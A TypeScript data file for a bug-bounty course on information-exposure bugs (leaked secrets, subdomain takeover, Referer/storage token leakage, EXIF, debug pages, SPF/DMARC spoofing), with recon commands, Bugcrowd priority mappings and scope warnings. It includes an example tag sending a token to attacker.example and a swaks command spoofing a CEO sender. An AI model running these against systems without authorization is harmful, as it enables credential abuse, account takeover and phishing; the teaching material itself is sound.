import type { LearnGroup } from "@/learn/data/types";

// Advanced, P3/P4-focused group: the "quiet" disclosure bugs that recon surfaces.
// Each leaf is scored off Bugcrowd VRT release 2026-07-08. These rarely stand as
// P1/P2 on their own — the craft is recognising the leaked primitive, proving it
// with a single benign read, and knowing which variant tips the priority up.
export const infoExposureGroup: LearnGroup = {
  id: "info-exposure",
  name: "Sensitive Data Exposure",
  emoji: "🔓",
  blurb:
    "The recon tier: secrets, dangling DNS, token spillage, EXIF, verbose internals and spoofable mail. Mostly P3/P4 standalone — the money is in spotting the variant that escalates and proving it without touching real data.",
  topics: [
    {
      id: "disclosure-of-secrets",
      name: "Disclosure of Secrets",
      emoji: "🗝️",
      intro:
        "A live credential (API/cloud key, DB connection string, signed token, private key block) reachable by an unauthorised party. The subtlety is asset classification: the same leaked key is P3 when it only exposes an internal/restricted asset (adjacent network, high attack complexity) and P1 the moment it is on a publicly accessible asset and still valid. Findability has shifted client-side — modern SPAs ship keys in webpack chunks, sourcemaps and inlined `.env` builds, and CI leaks them into public repos and Actions logs. The escalation edge is validity and blast radius: a verified-live key that calls a prod API is immediate provable access, which is why issuer-verifying scanners (not raw regex) are the signal that moves triage.",
      howToFind: [
        {
          title: "Harvest from client bundles and recon surface",
          steps: [
            "Pull every JS/JSON chunk and sourcemap (katana/gau → httpx), then scan the directory — do not hand-roll credential regex one-liners.",
            "Run an issuer-verifying scanner so you report only live keys: trufflehog --only-verified over the downloaded bundle dir, gitleaks over any cloned repo/history.",
            "Probe for exposed config: .git/config, .env, .DS_Store, *.bak, appsettings.json, firebase config, and leaking Actions logs on the org's public repos.",
            "Triage each hit by asset class first: is the thing it unlocks public (→ P1 path) or internal/restricted (→ P3)?",
          ],
        },
        {
          title: "Prove validity with ONE read-only call",
          steps: [
            "Confirm the key is live with a single identity/metadata call and stop — never enumerate, list, or read customer data.",
            "AWS: aws sts get-caller-identity. GCP: tokeninfo. Stripe: GET /v1/balance. A 200 that returns the caller identity is sufficient proof.",
            "Capture the request/response, the exact source location (file + line / commit), and whether the asset is public — then flag it to the user for rotation-urgency triage.",
          ],
        },
      ],
      payloads: [
        "trufflehog filesystem ./js-bundles --only-verified --json   (report only issuer-verified, live keys)",
        "gitleaks detect --source . --redact --no-banner   (history + working tree, secrets redacted in output)",
        "nuclei -l hosts.txt -t http/exposures/ -t http/credentials/   (exposed .env/.git/config/token leaks)",
        "curl -s https://target/.git/config   (confirm a dangling repo exists before anything else)",
        "aws sts get-caller-identity   (ONE read-only call proves an AWS key is live — do NOT list/read resources)",
      ],
      example:
        "A production SPA shipped a sourcemap that un-minified to a hardcoded internal analytics API key bound to a VPC-only host. trufflehog flagged it verified; a single identity call confirmed validity but the service was not internet-reachable, so it triaged P3 (internal asset, AV:A/AC:H). The same program later leaked a prod Stripe secret key in a public chunk — identical bug class, but a publicly accessible live key, scored P1.",
      mapping: {
        bugcrowdVrt: "Sensitive Data Exposure › Disclosure of Secrets › For Internal Asset",
        bugcrowdPriority: "P3",
        bugcrowdCvss: "AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:L",
        hackeroneCwe: "CWE-200: Exposure of Sensitive Information (and CWE-798: Use of Hard-coded Credentials)",
        cvssSeverity: "Medium (internal asset) → Critical/High",
        note:
          "Lead case is the internal/restricted asset = P3 (AV:A/AC:H). The same bug is P1 for a publicly accessible asset with a live key (CVSS AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L). Invalid, sample, or intentionally-public keys = P5.",
      },
      checklistCategoryId: "recon-js",
      references: [
        { label: "TruffleHog (issuer-verifying scanner)", url: "https://github.com/trufflesecurity/trufflehog" },
        { label: "PortSwigger: Information disclosure", url: "https://portswigger.net/web-security/information-disclosure" },
      ],
    },
    {
      id: "subdomain-takeover",
      name: "Subdomain Takeover",
      emoji: "🏚️",
      intro:
        "A subdomain's DNS record (usually a CNAME, sometimes an A/NS/MX) points at a third-party service whose resource has been de-provisioned but whose DNS was never cleaned up — a dangling pointer. Claiming that resource at the provider lets you serve content on the target's own trusted hostname. Standalone it is a P3 (low confidentiality/integrity, no data), but the real value is the trust the hostname carries: it is the classic improper-access-control primitive that chains into cookie theft (cookies scoped to `*.target.com`), OAuth redirect_uri allowlist abuse, CSP `script-src` allowlisting, and convincing phishing. The subtle findability is that many fingerprints only show under exact host headers or on fresh NXDOMAIN/404 states, so a single resolver pass misses them.",
      howToFind: [
        {
          title: "Enumerate and resolve for dangling pointers",
          steps: [
            "Build the widest subdomain list you can (subfinder -all + CT logs + wayback), then resolve CNAMEs: dnsx -cname -resp-only.",
            "Flag pointers at takeover-prone providers (S3, GitHub/GitLab Pages, Heroku, Azure, Fastly, Shopify, Zendesk, Netlify, Surge) and NXDOMAIN/unclaimed states.",
            "Match provider fingerprints with dnsReaper (best signal, active edge-case checks), nuclei http/takeovers templates, or subjack as a fast Go fallback.",
            "Cross-reference EdOverflow's can-i-take-over-xyz to confirm the service is actually claimable (some return a takeover-looking banner but are not exploitable).",
          ],
        },
        {
          title: "Prove safely, in scope only",
          steps: [
            "If the program permits claiming: register the resource and serve a single unique text marker (e.g. a UUID in a .txt) — never host a real login page or phishing content.",
            "If claiming is out of scope: report the dangling record + the provider fingerprint response as proof; do not claim.",
            "Note any chain multiplier in the report — is the host in an OAuth redirect allowlist, a CSP source, or a cookie domain? That is what lifts it above P3.",
          ],
        },
      ],
      payloads: [
        "subfinder -d target.com -all -silent | dnsx -cname -resp-only | sort -u   (map every CNAME)",
        "dnsReaper single --domain assets.target.com   (provider fingerprints + active checks)",
        "nuclei -l subs.txt -t http/takeovers/   (fingerprint dangling providers at scale)",
        "subjack -w subs.txt -ssl -c fingerprints.json   (fast fallback)",
        "dig +short assets.target.com CNAME   (manual confirm of the dangling target)",
      ],
      example:
        "assets.target.com CNAME'd to an S3 bucket that returned NoSuchBucket. The region was recoverable from the fingerprint, the bucket name was free, and claiming it let the hunter serve a UUID marker on the target's own subdomain — P3 on its own. It escalated when assets.target.com turned out to be in the SSO provider's redirect_uri allowlist, turning the takeover into an OAuth authorization-code theft path.",
      mapping: {
        bugcrowdVrt: "Server Security Misconfiguration › Misconfigured DNS › Subdomain Takeover",
        bugcrowdPriority: "P3",
        bugcrowdCvss: "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        hackeroneCwe: "CWE-284: Improper Access Control (dangling DNS / takeover)",
        cvssSeverity: "Medium (higher when chained to cookie scope / OAuth redirect / CSP)",
        note:
          "P3 standalone. A base-domain or MX/NS takeover, or one that cookies/OAuth/CSP trust, pushes impact up toward P1/P2 — score follows what the trusted hostname unlocks, not the takeover itself.",
      },
      checklistCategoryId: "recon-subdomain",
      references: [
        { label: "can-i-take-over-xyz (fingerprint matrix)", url: "https://github.com/EdOverflow/can-i-take-over-xyz" },
        { label: "dnsReaper", url: "https://github.com/punk-security/dnsReaper" },
      ],
    },
    {
      id: "token-leakage",
      name: "Token Leakage (Referer & Web Storage)",
      emoji: "📤",
      intro:
        "Sensitive tokens that spill out of their intended boundary: a secret placed in a URL query string leaks cross-site via the Referer header to untrusted third parties (analytics, ad pixels, CDN assets) whenever Referrer-Policy is unsafe; and bearer/session/reset tokens parked in localStorage or sessionStorage are reachable by any script in the origin. Both are high-attack-complexity P4s — the leak is real but needs a specific condition (a loaded 3rd-party resource, or an XSS/dependency to read storage). The escalation edge is what the token is: a leaked CSRF nonce or non-sensitive id stays P4/P5, but a leaked session/bearer or single-use reset token is a direct account-takeover primitive and is scored far higher. Findability is cheap and almost always skipped — it is one DevTools inventory and one header check.",
      howToFind: [
        {
          title: "Inventory web storage (read-only)",
          steps: [
            "In DevTools console, enumerate what the SPA persisted and classify each key: is it a session/bearer/refresh/reset token, or harmless UI state?",
            "Check whether storage survives logout and whether the same value is also sent as an auth header — that confirms it is a live session primitive, not a copy.",
            "Pair with the XSS surface: a sensitive token in localStorage turns any origin-scoped XSS into instant ATO, so note the chain even if you cannot read it yet.",
          ],
        },
        {
          title: "Hunt Referer spillage",
          steps: [
            "Find tokens placed in URLs: password-reset links, email-verification, magic-login, SAML/OAuth parameters, share links.",
            "Check Referrer-Policy on the page serving that URL — absent or unsafe-url/no-referrer-when-downgrade means the full URL (token included) leaks on every outbound request.",
            "Prove it: load a page whose URL holds the token and that references any off-domain resource; capture the Referer header arriving at the third party carrying the token.",
          ],
        },
      ],
      payloads: [
        "Object.keys(localStorage).forEach(k => console.log(k, localStorage.getItem(k)));   // DevTools: inventory persisted secrets",
        "Object.keys(sessionStorage).forEach(k => console.log(k, sessionStorage.getItem(k)));",
        "curl -sI https://app.target.com/reset | grep -i referrer-policy   (absent/unsafe-url => query-string tokens leak)",
        "<img src=\"https://attacker.example/pixel.png\">   (placed on a page whose URL holds ?token=... — Referer carries it off-site)",
      ],
      example:
        "A password-reset link put the single-use token in the query string, and the reset page loaded a third-party analytics script with Referrer-Policy: unsafe-url. The full reset URL — token and all — arrived in the analytics vendor's Referer logs. Standalone the storage/referer class is P4; because the leaked value was a reset token (account-takeover primitive handed to an untrusted third party), triage treated it well above the baseline.",
      mapping: {
        bugcrowdVrt: "Sensitive Data Exposure › Token Leakage via Referer › Over Untrusted 3rd Party Connection",
        bugcrowdPriority: "P4",
        bugcrowdCvss: "AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
        hackeroneCwe: "CWE-200: Exposure of Sensitive Information (and CWE-922: Insecure Storage of Sensitive Information)",
        cvssSeverity: "Low (→ High if the leaked token enables account takeover)",
        note:
          "Both variants are P4: Referer leak to untrusted 3rd party, and a sensitive token in localStorage/sessionStorage (CVSS AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N). A non-sensitive token = P5; a live session/bearer/reset token escalates well beyond Low.",
      },
      checklistCategoryId: "recon-js",
      references: [
        { label: "MDN: Referrer-Policy", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy" },
        { label: "OWASP WSTG: Web Storage", url: "https://owasp.org/www-project-web-security-testing-guide/" },
      ],
    },
    {
      id: "exif-geolocation",
      name: "EXIF Geolocation Not Stripped",
      emoji: "📍",
      intro:
        "An upload pipeline that serves user images without re-encoding leaves the original EXIF metadata intact — GPS latitude/longitude, capture timestamps, device make/model and sometimes owner name. The privacy leak itself is modest, but Bugcrowd splits it on enumerability: if you can map any image URL back to the user who posted it programmatically (predictable/sequential filenames, an API that returns the uploader), it is automatic user enumeration and scored P3; if correlating an image to a user needs manual effort, it drops to P4. The subtle findability is that the bug only exists when the server does NOT transcode — so the test is whether the bytes you download still carry the tags you uploaded.",
      howToFind: [
        {
          title: "Confirm metadata survives the pipeline",
          steps: [
            "Upload a test image containing known GPS + device tags, then download the served copy and diff the metadata with exiftool — if GPS survives, the pipeline isn't stripping.",
            "Also check thumbnails/resized variants and any CDN copy separately; sometimes the display size is stripped but an original/download endpoint is not.",
          ],
        },
        {
          title: "Decide automatic vs manual enumeration",
          steps: [
            "Look at how image URLs/filenames are formed: sequential ids, UUIDs that leak in a list API, or a user-id in the path all enable automatic correlation (→ P3).",
            "Pull EXIF from real in-scope uploads only to the extent needed to prove location data is present — do not harvest or aggregate users' personal locations.",
            "Report the leak + whether image→user mapping is automatable; that single fact is what sets P3 vs P4.",
          ],
        },
      ],
      payloads: [
        "exiftool -gps:all -City -State -Make -Model served-image.jpg   (does location survive the server?)",
        "exiftool -json -n image.jpg | jq '{GPSLatitude,GPSLongitude,CreateDate,Make,Model}'",
        "curl -s https://cdn.target.com/u/1001/avatar.jpg -o /tmp/a.jpg && exiftool -GPSPosition /tmp/a.jpg   (sequential id = auto-enum)",
      ],
      example:
        "A social feature served uploaded photos at /media/<sequential-id>.jpg with no re-encoding. exiftool on the downloaded bytes showed intact GPSPosition tags, and because the id was sequential and an adjacent API returned the uploader for each id, any image could be mapped to a user automatically — automatic user enumeration, P3. Had the mapping required manual OSINT, it would have been P4.",
      mapping: {
        bugcrowdVrt:
          "Sensitive Data Exposure › EXIF Geolocation Data Not Stripped From Uploaded Images › Automatic User Enumeration",
        bugcrowdPriority: "P3",
        bugcrowdCvss: "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        hackeroneCwe: "CWE-200: Exposure of Sensitive Information",
        cvssSeverity: "Medium (automatic enumeration); Low for manual",
        note:
          "P3 when image→user correlation is automatable (sequential ids / enumerable API). Drops to P4 for manual user enumeration. Only exists when the server doesn't transcode uploads.",
      },
      checklistCategoryId: "recon-content",
      references: [
        { label: "ExifTool", url: "https://exiftool.org/" },
        { label: "OWASP WSTG: Metadata exposure", url: "https://owasp.org/www-project-web-security-testing-guide/" },
      ],
    },
    {
      id: "verbose-errors-debug",
      name: "Verbose Errors, Debug Pages & GraphQL Introspection",
      emoji: "🧾",
      intro:
        "Internals the server should never expose to a client: detailed stack traces and framework debug pages (Flask/Django DEBUG=True, Rails, Symfony, ASP.NET yellow screens) that reveal file paths, library versions, SQL fragments, env vars and sometimes secrets; and GraphQL introspection left on, which hands over the entire schema — every type, field, mutation and argument. Both are low-severity on their own (P4 for a detailed debug/config page, P5 for introspection), but their true worth is as a force multiplier for the rest of your hunt: a leaked framework version pinpoints a known-CVE path, a stack trace with a SQL fragment confirms an injection point, and a full GraphQL schema maps hidden mutations that drive IDOR/auth testing. Findability is a handful of malformed inputs and one introspection query.",
      howToFind: [
        {
          title: "Trigger and read verbose errors",
          steps: [
            "Coax type-confusion / parser errors: send an array where a scalar is expected (?id[]=1), malformed JSON, a bad Content-Type, oversized or wrong-typed params, and an unhandled path.",
            "Read what leaks: framework + version, absolute file paths, DB engine + query fragments, stack frames, and any config/env echoed in the trace — note anything that sharpens another test.",
            "Sweep broadly with nuclei http/misconfiguration templates for exposed debug consoles (Werkzeug, Django, phpinfo, actuator).",
          ],
        },
        {
          title: "Probe GraphQL introspection",
          steps: [
            "Send a minimal __schema introspection query; a full type list back means introspection is enabled (P5), and fingerprint the engine with graphw00f.",
            "Use the recovered schema to enumerate mutations and sensitive fields — this is reconnaissance that feeds IDOR/auth/injection hunting, not a finding by itself.",
            "If introspection is disabled, note field-suggestion (clairvoyance) as the follow-up rather than reporting a dead end.",
          ],
        },
      ],
      payloads: [
        "curl -s 'https://api.target.com/graphql' -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}'",
        "graphw00f -d -t https://api.target.com/graphql   (engine fingerprint + introspection state)",
        "curl -s 'https://target/item?id[]=1'   (array where scalar expected → type-juggle stack trace)",
        "nuclei -u https://target -t http/misconfiguration/   (Werkzeug/Django/actuator/phpinfo debug surfaces)",
      ],
      example:
        "An API returned a full Werkzeug interactive debugger on a 500, leaking the absolute source path, the installed framework version and a SQL fragment from the failing query. On its own a P4 detailed-debug-page finding — but the version matched a known deserialization CVE and the SQL fragment confirmed a second injection point, so it became the pivot for two higher-severity reports rather than the headline itself.",
      mapping: {
        bugcrowdVrt: "Sensitive Data Exposure › Visible Detailed Error/Debug Page › Detailed Server Configuration",
        bugcrowdPriority: "P4",
        hackeroneCwe: "CWE-209: Generation of Error Message Containing Sensitive Information",
        cvssSeverity: "Low → Informational",
        note:
          "Detailed error/debug page = P4. GraphQL Introspection Enabled = P5 (CVSS AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N). Real value is as a multiplier: versions/paths/schema sharpen injection, CVE and IDOR hunting.",
      },
      checklistCategoryId: "recon-content",
      references: [
        { label: "PortSwigger: Information disclosure", url: "https://portswigger.net/web-security/information-disclosure" },
        { label: "graphw00f (GraphQL fingerprint)", url: "https://github.com/dolevf/graphw00f" },
      ],
    },
    {
      id: "email-spoofing",
      name: "Email Spoofing (SPF / DMARC)",
      emoji: "✉️",
      intro:
        "Missing or weak sender-authentication on a domain lets an attacker send mail that appears to come from it. The two layers matter independently: SPF/DKIM authorise sending hosts, while DMARC (with an enforcing policy) tells receivers to reject/quarantine mail that fails them. Bugcrowd grades on the resulting capability: a domain with no effective spoofing protection at all is P3, while a domain that has records but a non-enforcing DMARC policy (p=none) that still lets spoofed mail reach the inbox is P4. It is dropped as out-of-scope by many programs, so read scope.md first. Findability is pure DNS — three dig lookups — and the escalation edge is the domain's role: spoofing a transactional/login-notification sender feeds phishing and social-engineering chains far better than spoofing a parked domain.",
      howToFind: [
        {
          title: "Read the DNS policy layers",
          steps: [
            "SPF: dig TXT target.com — is there a v=spf1 record, and does it end in -all (hard fail), ~all (soft fail) or ?all/+all (effectively none)?",
            "DMARC: dig TXT _dmarc.target.com — p=reject/quarantine enforces; p=none (or no record) means spoofed mail is accepted to the inbox.",
            "DKIM: check a likely selector (default._domainkey, google._domainkey) to see whether signing is even configured.",
            "Classify: no SPF and no enforcing DMARC → P3; records present but p=none allowing inbox delivery → P4.",
          ],
        },
        {
          title: "Prove benignly, in scope and to yourself only",
          steps: [
            "Only if the program allows email testing: send a single spoofed message from the domain to your OWN inbox and screenshot it landing with a passing/neutral authentication summary.",
            "Never spoof mail to the program's users, staff, or any third party — the PoC recipient is always your own mailbox.",
            "Report the exact records, the policy gap, and which sender role (transactional vs marketing vs parked) makes it dangerous.",
          ],
        },
      ],
      payloads: [
        "dig +short TXT target.com | grep -i spf   (present? and -all vs ~all vs ?all)",
        "dig +short TXT _dmarc.target.com   (p=none|quarantine|reject — none = spoofable to inbox)",
        "dig +short TXT default._domainkey.target.com   (DKIM selector configured?)",
        "swaks --to you@yourmail.com --from ceo@target.com --server <your-relay> --header 'Subject: spoof PoC'   (to your OWN inbox only, if in scope)",
      ],
      example:
        "target.com published v=spf1 ... ~all (soft fail) and had no _dmarc record at all. A benign test message sent as billing@target.com to the hunter's own inbox arrived with no authentication enforcement — no effective spoofing protection on the email domain, P3. A sibling domain that did publish DMARC but at p=none (so spoofed mail still reached the inbox) was the P4 variant.",
      mapping: {
        bugcrowdVrt: "Server Security Misconfiguration › Mail Server Misconfiguration › No Spoofing Protection on Email Domain",
        bugcrowdPriority: "P3",
        bugcrowdCvss: "AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
        hackeroneCwe: "CWE-358: Improperly Implemented Security Check for Standard (and CWE-290: Authentication Bypass by Spoofing)",
        cvssSeverity: "Medium (no SPF/DMARC at all); Low for DMARC-only spoof-to-inbox",
        note:
          "No effective spoofing protection = P3. 'Email Spoofing to Inbox due to Missing or Misconfigured DMARC' (records present but p=none) = P4. Frequently out-of-scope — check scope.md before testing or reporting.",
      },
      checklistCategoryId: "recon-email",
      references: [
        { label: "DMARC.org overview", url: "https://dmarc.org/overview/" },
        { label: "swaks (SMTP test tool)", url: "https://github.com/jetmore/swaks" },
      ],
    },
  ],
};
